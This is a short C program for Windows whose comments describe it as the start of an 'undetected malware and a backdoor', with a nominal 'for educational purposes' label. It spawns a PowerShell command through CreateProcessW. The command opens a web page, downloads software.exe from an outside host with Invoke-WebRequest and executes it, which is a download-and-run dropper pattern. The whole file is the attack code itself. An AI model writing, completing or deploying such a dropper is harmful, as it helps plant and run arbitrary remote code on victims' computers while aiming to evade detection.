#include <stdio.h>
#include <windows.h>

int main(void) {

    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    
    /**
     * Inig run sa software mo automatic redirect sa website ug mo download sa Software.exe and automatic run and software.
     * NOTE THIS IS NOT TESTED YET, THSI IS THE STARTING POINT OF MAKING SIMPLE BACKDOOR EXECUTION.
     * 
     * THE GOAL IS TO MAKE UNDETECTED MALWARE AND A BACKDOOR! 
     * 
     * THIS IS FOR EDUCATIONAL PURPOSES!
     * **/
    wchar_t *psCommand = L"powershell.exe -Command \"Start-Process 'https://www.example.com'; " 
                         L"Invoke-WebRequest -Uri 'https://example.com/software.exe' -OutFile 'C:\\Path\\To\\Downloaded\\software.exe'; "
                         L"Start-Process 'C:\\Path\\To\\Downloaded\\software.exe'\"";

    // Create the process to execute the PowerShell command
    if (!CreateProcessW(NULL, psCommand, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi )) {
        printf("(-) failed to create process, error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    DWORD TID = pi.dwThreadId;
    DWORD PID = pi.dwProcessId;
    HANDLE hThread = pi.hThread;
    HANDLE hProcess = pi.hProcess;

    printf("(+) process started! pid: %ld\n", PID);
    printf("\t(+) pid: %ld, handle: 0x%x\n", PID, hProcess);
    printf("\t(+) tid: %ld, handle: 0x%x\n", TID, hThread);

    WaitForSingleObject(hProcess, INFINITE);
    printf("(+) finished! exiting...");

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return EXIT_SUCCESS;
}
